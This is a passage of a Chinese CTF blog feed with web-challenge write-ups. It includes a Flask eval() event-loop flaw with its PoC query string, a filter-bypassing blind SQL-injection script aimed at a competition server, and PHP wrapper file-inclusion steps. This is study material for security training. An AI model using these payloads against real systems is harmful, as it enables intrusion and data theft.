class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request, Response</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">'*********************'</span>  <span class="comment"># censored</span></span><br><span class="line">url_prefix = <span class="string">'/d5afe1f66147e857'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">FLAG</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'*********************'</span>  <span class="comment"># censored</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger_event</span><span class="params">(event)</span>:</span></span><br><span class="line">    session[<span class="string">'log'</span>].append(event)</span><br><span class="line">    <span class="keyword">if</span> len(session[<span class="string">'log'</span>]) &gt; <span class="number">5</span>:</span><br><span class="line">        session[<span class="string">'log'</span>] = session[<span class="string">'log'</span>][<span class="number">-5</span>:]</span><br><span class="line">    <span class="keyword">if</span> type(event) == type([]):</span><br><span class="line">        request.event_queue += event</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        request.event_queue.append(event)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mid_str</span><span class="params">(haystack, prefix, postfix=None)</span>:</span></span><br><span class="line">    haystack = haystack[haystack.find(prefix)+len(prefix):]</span><br><span class="line">    <span class="keyword">if</span> postfix <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        haystack = haystack[:haystack.find(postfix)]</span><br><span class="line">    <span class="keyword">return</span> haystack</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RollBackException</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute_event_loop</span><span class="params">()</span>:</span></span><br><span class="line">    valid_event_chars = set(</span><br><span class="line">        <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#'</span>)</span><br><span class="line">    resp = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">while</span> len(request.event_queue) &gt; <span class="number">0</span>://</span><br><span class="line">        <span class="comment"># `event` is something like "action:ACTION;ARGS0#ARGS1#ARGS2......"</span></span><br><span class="line">        event = request.event_queue[<span class="number">0</span>]</span><br><span class="line">        request.event_queue = request.event_queue[<span class="number">1</span>:]//从队列中取出队头元素</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> event.startswith((<span class="string">'action:'</span>, <span class="string">'func:'</span>))://不符合继续循环</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> event:</span><br><span class="line">            <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> valid_event_chars:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            is_action = event[<span class="number">0</span>] == <span class="string">'a'</span></span><br><span class="line">            action = get_mid_str(event, <span class="string">':'</span>, <span class="string">';'</span>)</span><br><span class="line">            args = get_mid_str(event, action+<span class="string">';'</span>).split(<span class="string">'#'</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                event_handler = eval(</span><br><span class="line">                    action + (<span class="string">'_handler'</span> <span class="keyword">if</span> is_action <span class="keyword">else</span> <span class="string">'_function'</span>))</span><br><span class="line">                ret_val = event_handler(args)</span><br><span class="line">            <span class="keyword">except</span> RollBackException:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    resp = <span class="string">''</span></span><br><span class="line">                resp += <span class="string">'ERROR! All transactions have been cancelled. &lt;br /&gt;'</span></span><br><span class="line">                resp += <span class="string">'&lt;a href="./?action:view;index"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">                session[<span class="string">'num_items'</span>] = request.prev_session[<span class="string">'num_items'</span>]</span><br><span class="line">                session[<span class="string">'points'</span>] = request.prev_session[<span class="string">'points'</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> Exception, e:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    resp = <span class="string">''</span></span><br><span class="line">                <span class="comment"># resp += str(e) # only for debugging</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> ret_val <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    resp = ret_val</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    resp += ret_val</span><br><span class="line">    <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> resp == <span class="string">''</span>:</span><br><span class="line">        resp = (<span class="string">'404 NOT FOUND'</span>, <span class="number">404</span>)</span><br><span class="line">    session.modified = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(url_prefix+'/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">entry_point</span><span class="params">()</span>:</span></span><br><span class="line">    querystring = urllib.unquote(request.query_string)</span><br><span class="line">    request.event_queue = []</span><br><span class="line">    <span class="keyword">if</span> querystring == <span class="string">''</span> <span class="keyword">or</span> (<span class="keyword">not</span> querystring.startswith(<span class="string">'action:'</span>)) <span class="keyword">or</span> len(querystring) &gt; <span class="number">100</span>:</span><br><span class="line">        querystring = <span class="string">'action:index;False#False'</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'num_items'</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        session[<span class="string">'num_items'</span>] = <span class="number">0</span></span><br><span class="line">        session[<span class="string">'points'</span>] = <span class="number">3</span></span><br><span class="line">        session[<span class="string">'log'</span>] = []</span><br><span class="line">    request.prev_session = dict(session)</span><br><span class="line">    trigger_event(querystring)</span><br><span class="line">    <span class="keyword">return</span> execute_event_loop()</span><br><span class="line"></span><br><span class="line"><span class="comment"># handlers/functions below --------------------------------------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">    page = args[<span class="number">0</span>]</span><br><span class="line">    html = <span class="string">''</span></span><br><span class="line">    html += <span class="string">'[INFO] you have &#123;&#125; diamonds, &#123;&#125; points now.&lt;br /&gt;'</span>.format(</span><br><span class="line">        session[<span class="string">'num_items'</span>], session[<span class="string">'points'</span>])</span><br><span class="line">    <span class="keyword">if</span> page == <span class="string">'index'</span>:</span><br><span class="line">        html += <span class="string">'&lt;a href="./?action:index;True%23False"&gt;View source code&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">        html += <span class="string">'&lt;a href="./?action:view;shop"&gt;Go to e-shop&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">        html += <span class="string">'&lt;a href="./?action:view;reset"&gt;Reset&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">    <span class="keyword">elif</span> page == <span class="string">'shop'</span>:</span><br><span class="line">        html += <span class="string">'&lt;a href="./?action:buy;1"&gt;Buy a diamond (1 point)&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">    <span class="keyword">elif</span> page == <span class="string">'reset'</span>:</span><br><span class="line">        <span class="keyword">del</span> session[<span class="string">'num_items'</span>]</span><br><span class="line">        html += <span class="string">'Session reset.&lt;br /&gt;'</span></span><br><span class="line">    html += <span class="string">'&lt;a href="./?action:view;index"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">    <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">    bool_show_source = str(args[<span class="number">0</span>])</span><br><span class="line">    bool_download_source = str(args[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> bool_show_source == <span class="string">'True'</span>:</span><br><span class="line"></span><br><span class="line">        source = open(<span class="string">'eventLoop.py'</span>, <span class="string">'r'</span>)</span><br><span class="line">        html = <span class="string">''</span></span><br><span class="line">        <span class="keyword">if</span> bool_download_source != <span class="string">'True'</span>:</span><br><span class="line">            html += <span class="string">'&lt;a href="./?action:index;True%23True"&gt;Download this .py file&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">            html += <span class="string">'&lt;a href="./?action:view;index"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> source:</span><br><span class="line">            <span class="keyword">if</span> bool_download_source != <span class="string">'True'</span>:</span><br><span class="line">                html += line.replace(<span class="string">'&amp;'</span>, <span class="string">'&amp;amp;'</span>).replace(<span class="string">'\t'</span>, <span class="string">'&amp;nbsp;'</span>*<span class="number">4</span>).replace(</span><br><span class="line">                    <span class="string">' '</span>, <span class="string">'&amp;nbsp;'</span>).replace(<span class="string">'&lt;'</span>, <span class="string">'&amp;lt;'</span>).replace(<span class="string">'&gt;'</span>, <span class="string">'&amp;gt;'</span>).replace(<span class="string">'\n'</span>, <span class="string">'&lt;br /&gt;'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                html += line</span><br><span class="line">        source.close()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> bool_download_source == <span class="string">'True'</span>:</span><br><span class="line">            headers = &#123;&#125;</span><br><span class="line">            headers[<span class="string">'Content-Type'</span>] = <span class="string">'text/plain'</span></span><br><span class="line">            headers[<span class="string">'Content-Disposition'</span>] = <span class="string">'attachment; filename=serve.py'</span></span><br><span class="line">            <span class="keyword">return</span> Response(html, headers=headers)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> html</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        trigger_event(<span class="string">'action:view;index'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">    num_items = int(args[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> num_items &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;'</span>.format(args[<span class="number">0</span>])</span><br><span class="line">    session[<span class="string">'num_items'</span>] += num_items</span><br><span class="line">    trigger_event([<span class="string">'func:consume_point;&#123;&#125;'</span>.format(</span><br><span class="line">        num_items), <span class="string">'action:view;index'</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">consume_point_function</span><span class="params">(args)</span>:</span></span><br><span class="line">    point_to_consume = int(args[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">'points'</span>] &lt; point_to_consume:</span><br><span class="line">        <span class="keyword">raise</span> RollBackException()</span><br><span class="line">    session[<span class="string">'points'</span>] -= point_to_consume</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_flag_function</span><span class="params">(args)</span>:</span></span><br><span class="line">    flag = args[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'You naughty boy! ;) &lt;br /&gt;'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">'num_items'</span>] &gt;= <span class="number">5</span>:</span><br><span class="line">        <span class="comment"># show_flag_function has been disabled, no worries</span></span><br><span class="line">        trigger_event(<span class="string">'func:show_flag;'</span> + FLAG())</span><br><span class="line">    trigger_event(<span class="string">'action:view;index'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="literal">False</span>, host=<span class="string">'0.0.0.0'</span>)</span><br></pre></td></tr></table></figure><p>来看看几个比较重要的函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">    num_items = int(args[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> num_items &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;'</span>.format(args[<span class="number">0</span>])</span><br><span class="line">    session[<span class="string">'num_items'</span>] += num_items</span><br><span class="line">    trigger_event([<span class="string">'func:consume_point;&#123;&#125;'</span>.format(</span><br><span class="line">        num_items), <span class="string">'action:view;index'</span>])</span><br></pre></td></tr></table></figure><p>这里会对num_items先进行判断，如果不够就会先加上</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">consume_point_function</span><span class="params">(args)</span>:</span></span><br><span class="line">    point_to_consume = int(args[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">'points'</span>] &lt; point_to_consume:</span><br><span class="line">        <span class="keyword">raise</span> RollBackException()</span><br><span class="line">    session[<span class="string">'points'</span>] -= point_to_consume</span><br></pre></td></tr></table></figure><p>对points判断，如果小于将要消费的数目，就会报错，并且扣除消费的数目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">'num_items'</span>] &gt;= <span class="number">5</span>:</span><br><span class="line">        <span class="comment"># show_flag_function has been disabled, no worries</span></span><br><span class="line">        trigger_event(<span class="string">'func:show_flag;'</span> + FLAG())</span><br><span class="line">    trigger_event(<span class="string">'action:view;index'</span>)</span><br></pre></td></tr></table></figure><p>只要session中num_items的值大于5就能够拿到flag</p><p>简而言之，就是要先骗到五个钻石，之后拿着flag跑就行了</p><p>在execute_event_loop()函数中有关键部分</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">event_handler = eval(</span><br><span class="line">                    action + (<span class="string">'_handler'</span> <span class="keyword">if</span> is_action <span class="keyword">else</span> <span class="string">'_function'</span>))</span><br><span class="line">                ret_val = event_handler(args)</span><br></pre></td></tr></table></figure><p>eval可以写入语句导致任意命令执行，只要让buy_handler和get_flag_handler先进入队列，那么就可以达到目的，同时这里的action通过#可以注释后面的检测拼接</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger_event</span><span class="params">(event)</span>:</span></span><br><span class="line">    session[<span class="string">'log'</span>].append(event)</span><br><span class="line">    <span class="keyword">if</span> len(session[<span class="string">'log'</span>]) &gt; <span class="number">5</span>:</span><br><span class="line">        session[<span class="string">'log'</span>] = session[<span class="string">'log'</span>][<span class="number">-5</span>:]</span><br><span class="line">    <span class="keyword">if</span> type(event) == type([]):</span><br><span class="line">        request.event_queue += event</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        request.event_queue.append(event)</span><br></pre></td></tr></table></figure><p>trigger_event控制着队列的进出，这样就联系起来了，只要让eval执行trigger_event，再将buy和get_flag传入，就会先一步进入队列</p><p>get_mid_str(event, ‘:’, ‘;’),这个函数会找第一个参数中，第二个参数和第三个参数之间的字符串</p><p>poc：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action:trigger_event%23;action:buy;2%23action:buy;3%23action:get_flag;%23</span><br></pre></td></tr></table></figure><p>所以，action:buy;经过get_mid_str函数和eval拼接就变成了buy_handler(5)，后面的差不多理解就可以了</p><p>然后就是打过去，这里要用到工具，附上GitHub地址：<a href="https://github.com/noraj/flask-session-cookie-manager" target="_blank" rel="noopener">https://github.com/noraj/flask-session-cookie-manager</a></p><img src="/2020/05/29/buuoj4/16.png" class=""><p>之后数据base64解密即可</p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WHUCTF</title>
      <link href="/2020/05/25/WHUCTF/"/>
      <url>/2020/05/25/WHUCTF/</url>
      
        <content type="html"><![CDATA[<h4 id="Easy-sqli"><a href="#Easy-sqli" class="headerlink" title="Easy_sqli"></a>Easy_sqli</h4><a id="more"></a><p>题目打开是个登录框，根据题目应该就是sql注入，万能密钥登录，弹窗显示登录成功，无其他回显，判断是盲注</p><p>fuzz一下，过滤了or、select等，双写绕过成功，直接贴脚本吧（第一次自己手写的脚本，真的是很喜悦了，虽然没有二分法快）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Author peguin</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://218.197.154.9:10011/login.php"</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0'</span>,</span><br><span class="line">    <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'</span>,</span><br><span class="line"><span class="string">'Connection'</span>:<span class="string">'keep-alive'</span></span><br><span class="line">&#125;</span><br><span class="line">res = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_,&#123;&#125;!@#$%^&amp;*()?~'</span>:</span><br><span class="line">        <span class="comment"># passwd = "1' oorr ascii(substr((selselectect database()),&#123;&#125;,1))=&#123;&#125;#".format(i,ord(j))#easy_sql1</span></span><br><span class="line">        <span class="comment">#passwd = "1' oorr ascii(substr((selselectect group_concat(table_name) frfromom infoorrmation_schema.tables whewherere table_schema='easy_sql1'),&#123;&#125;,1))=&#123;&#125;#".format(i,ord(j))#f1ag_y0u_wi1l_n3ver_kn0w,users</span></span><br><span class="line">        <span class="comment">#passwd = "1' oorr ascii(substr((selselectect group_concat(column_name) frfromom infoorrmation_schema.columns whewherere table_name='f1ag_y0u_wi1l_n3ver_kn0w'),&#123;&#125;,1))=&#123;&#125;#".format(i, ord(j))#f111114g</span></span><br><span class="line">        passwd = <span class="string">"1' oorr ascii(substr((seselectlect f111114g frfromom f1ag_y0u_wi1l_n3ver_kn0w),&#123;&#125;,1))=&#123;&#125;#"</span>.format(i, ord(j))</span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'user'</span>:passwd,</span><br><span class="line">            <span class="string">'pass'</span>:<span class="string">'123'</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># print(passwd)</span></span><br><span class="line">        r = requests.post(url,data=data,headers=headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Login success!'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            res += j</span><br><span class="line">            print(res)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>这里用二分法会很快，而且用二分法可以不用考虑特殊字符，都包含在里面了，抽时间写一个二分法的盲注轮子</p><h4 id="ezinclude"><a href="#ezinclude" class="headerlink" title="ezinclude"></a>ezinclude</h4><p>打开题目，在contact页面发现有提交框，猜测利用点在这里，随便写写提交，F12，发现点提示</p><img src="/2020/05/25/WHUCTF/1.png" class=""><p>脑洞，一时之间想不到办法，无意多刷新了几次，发现脚注那里的内容会改变，猜测get点有隐藏的参数没有显示，根据以往的经验，，一般文件包含的参数都会是file，猜测尝试，成功</p><img src="/2020/05/25/WHUCTF/2.png" class=""><p>下面就是用php伪协议读取，这里直接尝试读取flag.php</p><img src="/2020/05/25/WHUCTF/3.png" class=""><h4 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h4><p>开题，给源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line">$string_1 = $_GET[<span class="string">'str1'</span>];</span><br><span class="line">$string_2 = $_GET[<span class="string">'str2'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//1st</span></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'num'</span>] !== <span class="string">'23333'</span> &amp;&amp; preg_match(<span class="string">'/^23333$/'</span>, $_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'1st ok'</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'会代码审计嘛23333'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//2nd</span></span><br><span class="line"><span class="keyword">if</span>(is_numeric($string_1))&#123;</span><br><span class="line">    $md5_1 = md5($string_1);</span><br><span class="line">    $md5_2 = md5($string_2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($md5_1 != $md5_2)&#123;</span><br><span class="line">        $a = strtr($md5_1, <span class="string">'pggnb'</span>, <span class="string">'12345'</span>);</span><br><span class="line">        $b = strtr($md5_2, <span class="string">'pggnb'</span>, <span class="string">'12345'</span>);</span><br><span class="line">        <span class="keyword">if</span>($a == $b)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'2nd ok'</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"can u give me the right str???"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no!!!!!!!!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'is str1 numeric??????'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//3nd</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="string">'/x/'</span>, <span class="string">'yy'</span>, $string);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = $_POST[<span class="string">'username'</span>];</span><br><span class="line"></span><br><span class="line">$password = <span class="string">"aaaaa"</span>;</span><br><span class="line">$user = <span class="keyword">array</span>($username, $password);</span><br><span class="line"></span><br><span class="line">$r = filter(serialize($user));</span><br><span class="line"><span class="keyword">if</span>(unserialize($r)[<span class="number">1</span>] 